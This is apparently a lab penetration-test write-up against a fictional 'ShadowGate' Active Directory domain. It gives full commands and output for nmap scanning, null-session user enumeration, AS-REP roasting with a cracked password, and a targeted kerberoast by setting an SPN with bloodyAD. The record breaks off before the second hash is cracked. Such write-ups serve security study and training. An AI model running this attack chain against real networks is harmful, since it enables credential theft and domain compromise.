
# Objective and scope

**ShadowGate** recently completed a corporate acquisition that significantly expanded its internal network, user base, and application footprint. Several business-critical systems were migrated and consolidated under tight operational deadlines to minimize downtime and maintain service continuity.

While functional validation was completed, the organization deferred a comprehensive security assessment due to delivery pressure and staffing constraints. Leadership has since requested an independent penetration test to validate the security posture of the newly created environment and identify any material risk before the next audit cycle.

The assessment will evaluate whether a motivated attacker with standard network access could compromise sensitive systems, escalate privileges, or move laterally within the enterprise environment.

The Hack Smarter team has been authorized to perform a black box internal penetration test against the ShadowGate environment.

# Host file setup

```python
sudo nxc smb 10.1.180.146 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.1.180.146    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
```

- SMB signing is off

# Enumeration

## Open ports
```python
nmap -p- --min-rate=2000 -sT dc01.shadow.gate -Pn
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-15 13:41:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
```

## Nmap
```python
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -A --min-rate=2000 -sT dc01.shadow.gate 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-10 18:37 +0100
Nmap scan report for dc01.shadow.gate (10.1.180.146)
Host is up (0.096s latency).
rDNS record for 10.1.180.146: DC01.shadow.gate

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-10 17:37:42Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Not valid before: 2026-01-15T01:10:24
|_Not valid after:  2027-01-15T01:10:24
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Not valid before: 2026-01-15T01:10:24
|_Not valid after:  2027-01-15T01:10:24
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Not valid before: 2026-01-15T01:10:24
|_Not valid after:  2027-01-15T01:10:24
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Not valid before: 2026-01-15T01:10:24
|_Not valid after:  2027-01-15T01:10:24
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Not valid before: 2026-01-11T02:45:29
|_Not valid after:  2026-07-13T02:45:29
| rdp-ntlm-info: 
|   Target_Name: SHADOW
|   NetBIOS_Domain_Name: SHADOW
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: shadow.gate
|   DNS_Computer_Name: DC01.shadow.gate
|   Product_Version: 10.0.20348
|_  System_Time: 2026-05-10T17:38:31+00:00
|_ssl-date: 2026-05-10T17:39:11+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```
The webserver running is just a default IIS server

# SMB (445)

## Null auth
```python
nxc smb dc01.shadow.gate -u '' -p '' --users-export users.txt
SMB         10.1.180.146    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.180.146    445    DC01             [+] shadow.gate\: 
SMB         10.1.180.146    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.1.180.146    445    DC01             Administrator                 2026-01-11 11:33:05 0       Built-in account for administering the computer/domain 
SMB         10.1.180.146    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.1.180.146    445    DC01             krbtgt                        2026-01-12 02:45:27 0       Key Distribution Center Service Account 
SMB         10.1.180.146    445    DC01             ATHENA                        2026-03-04 15:23:19 0        
SMB         10.1.180.146    445    DC01             mbrownlee                     2026-03-04 15:24:05 0        
SMB         10.1.180.146    445    DC01             bbrown                        2026-01-15 14:24:07 0        
SMB         10.1.180.146    445    DC01             jtrueblood                    2026-04-28 18:14:47 0        
SMB         10.1.180.146    445    DC01             jsmith                        2026-03-04 15:26:29 0        
SMB         10.1.180.146    445    DC01             clocke                        2026-03-04 15:24:32 0        
SMB         10.1.180.146    445    DC01             tclarke                       2026-03-04 15:25:33 0        
SMB         10.1.180.146    445    DC01             jbradford                     2026-03-04 15:24:59 0        
SMB         10.1.180.146    445    DC01             amoss                         2026-03-04 15:25:52 0        
SMB         10.1.180.146    445    DC01             [*] Enumerated 12 local users: SHADOW
SMB         10.1.180.146    445    DC01             [*] Writing 12 local users to users.txt
```
I am able to use null auth to dump users but not able to list shares

The guest account is disabled

# AS-REP roasting leads to user compromise

```python
nxc ldap dc01.shadow.gate -u users.txt -p '' --asreproast asrep.hash             
LDAP        10.1.130.196    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:shadow.gate) (signing:None) (channel binding:Never) 
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
LDAP        10.1.130.196    389    DC01             $krb5asrep$23$jtrueblood@SHADOW.GATE:eaa351956f6d85d764b2bb1dc7829e68$d77aa89f900cdbe3580df5fcb6c7de8528ee114d5025e47cbf4a347833b9ba86e53e653fa9c39926f99d8e66693c19ff5d4d1b7a874431dd7960ec88fc43fb1b7178c920cc90806dced395f5276d137d9b76fb2bcdb2770b45ac46d4ecf13b39dec451afa97e38c3be9b59ef97d824cd2e1890129bba190b04b72e9c345cee041dedcaf6a75c102a3f38a639641bb0b0128ff2814dba990b6e045db85b67609248567ef143697a563b20f1314ce698ae4a4ea4f217671ca50471d5b5dda5ba39a896e376c6cc32d7951dac528a2983a6098e11e61b70cdb7d9ef315288d83d8006a950e6e41432f75e98
```
Found a hash for a user account

## Cracking the hash
```python
hashcat asrep.hash /usr/share/wordlists/rockyou.txt

$krb5asrep$23$jtrueblood@SHADOW.GATE:eaa351956f6d85d764b2bb1dc7829e68$d77aa89f900cdbe3580df5fcb6c7de8528ee114d5025e47cbf4a347833b9ba86e53e653fa9c39926f99d8e66693c19ff5d4d1b7a874431dd7960ec88fc43fb1b7178c920cc90806dced395f5276d137d9b76fb2bcdb2770b45ac46d4ecf13b39dec451afa97e38c3be9b59ef97d824cd2e1890129bba190b04b72e9c345cee041dedcaf6a75c102a3f38a639641bb0b0128ff2814dba990b6e045db85b67609248567ef143697a563b20f1314ce698ae4a4ea4f217671ca50471d5b5dda5ba39a896e376c6cc32d7951dac528a2983a6098e11e61b70cdb7d9ef315288d83d8006a950e6e41432f75e98:blood_brothers
```
The hash cracked

```python
jtrueblood:blood_brothers
```
Ill verify these credentials

```python
nxc smb dc01.shadow.gate -u jtrueblood -p 'blood_brothers'                                   
SMB         10.1.130.196    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.130.196    445    DC01             [+] shadow.gate\jtrueblood:blood_brothers
```
This user is now compromised

Now i have initial access i can see if any users are kerberoastable!

None are kerberoastable

This user also does not have access over RDP or WINRM

# Bloodhound

![](Pasted%20image%2020260510191247.png)

This user has GenericWrite over the user `bbrown`

I can either do a targeted kerberoast or apply shadow credentials

Ill try a targeted kerberoast first 

# Targeted kerberoast leads to user compromise

```python
bloodyAD --host dc01.shadow.gate -d shadow.gate -u 'jtrueblood' -p 'blood_brothers' set object 'bbrown' servicePrincipalName -v 'service/hacked'

[+] bbrown's servicePrincipalName has been updated
```
Ill start by adding the users SPN

```python
nxc ldap dc01.shadow.gate -u jtrueblood -p 'blood_brothers' --kerberoasting kerb.hash                    
LDAP        10.1.130.196    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:shadow.gate) (signing:None) (channel binding:Never) 
LDAP        10.1.130.196    389    DC01             [+] shadow.gate\jtrueblood:blood_brothers 
LDAP        10.1.130.196    389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.1.130.196    389    DC01             [*] Total of records returned 1
LDAP        10.1.130.196    389    DC01             [*] sAMAccountName: bbrown, memberOf: CN=ADCS-Reader,CN=Users,DC=shadow,DC=gate, pwdLastSet: 2026-01-15 14:24:07.120150, lastLogon: <never>
LDAP        10.1.130.196    389    DC01             $krb5tgs$23$*bbrown$SHADOW.GATE$shadow.gate\bbrown*$6bd6a9b56e8040df04bae8c345ade1f9$9a250c9df6f1c6498a7c976bcfb1034d8220fba826f940990179544c8be3905561805b1fab26f437e2b0ed886f40258e93c6abfdacee04f5e2b1c01f2cc41cac662a94d8f9ef02ffdaadabec64c99f1d4c6ae97c12d5ad27fcd72333c14db174a6b8d1ffe9792d7348b7d38f817f5de62f1ce79474dd7f567188807abfddd572597701a9af724dd6a9e3bb318b784cfd5b0158496a5f2c03aa6ddbb4b018f7ce4b7c3dcf512a2628e50d7c1eb291ed3f750a0c82dbebe3e51bf444a9caae336d6b5687048d1d3777e375683b92a7b660fc8ed94afd9b9e2825fc5f1b25fc30d9e8636c2c3624490990218723bbd978cd3e2ed0db83f158d5f89387e0d2cc174fba1370e863b8e88c5df93f78f1c1d8f19cc6dba9e83176280fb8a93554989661a4cdfea5ddbc982a84e19988a38d915773ab6d2c126aa064ae8484e596ef1d1f0c018a93490b93a1bea16029f33099e936e1e6aab01711fe4cc184eefa3866b6033df0cbc42183558ca1d842257f8c9d8e2e2055d0d87984da0500e572a924689f43717446ba98b201f9040ac554283a8301a72533bb02839fb0db15838b9fa3bd93cf0dae5e25dcc37a1b218a92c3ef4f12c0b26acaa02c196d285e0fcd5817b75b7390a728c2024719091ef7c719aa8bda648773f632f8334795aa64abf40440937ea43e33573cd399491c235a556fa8312cabb8be46065f5e411b1d4c785418713ca4ccf2222a9ff51a095a05c3b878ae213870f874e3c20f9ba834eec5cd5b0a0b32165b774ddccd46ceed1290b527c257ddb6007a7650c845188d2e47b6126782580eaecad25a3a2884b5f6824685c7881389b5b303d4fde04e38caf4008f4948f0c0f5c5ebf071cafea675846b41ccf732ddc97287e16b07f7e5a510d8f6d7bd1d5fdd22c7ce97d73aea2edaf9feeb56782e7b170c1d569603d401062c4bce7c2f8037c99c98f80587fdbddd999a8ecb671b27189e65452c1b4f93dc3dec251b69cd196845a9ac28ec89ae3467adc0ceecffc7237fcac9aa7510f903628260041ebd2eff51ed4967287d65be43bee6eb0d6abeaa17984a859514fa49dd98b67355d28eb42183dfb8df11f252a45d931fd192aadc709c596b4f3f662ff28ea93701d0cd2f794ecea3b56efa915dc6e9284628fa06d95e28fbd849d66107fcf1547cb76bdbb7e74f0fd691ea812d0259aefd387a82d570a68380707c84df09813ac25164f7d6f6dfa8474e1c9f112030fcf94b8a25a712758e629dca2b313d7833f7a95bbb76b1078880298d5676167055303e9b28c8851867caa95fb2e28d3ac7fd76bbf2caee46ab5e87859df0e2b93638cc87bc38c45cd68862341334249efbb8a3685b75f80177fc37c591bb286315a493493bb2f3c0814721efde3d7b806fdd8dbe9acae6c571caf3850a0f40cd556d3f701d3c7f2db25477a201155b9eaa7ba8bce9bb8e148d9265d1237b3276710258fefc67fd62ac495c3986e4bbdb3fcbb2ff9ac8deff5cd6d4ae8d7d992310d16163
```
Now i have the hash i can try to crack it!

## Cracking the hash

```python

```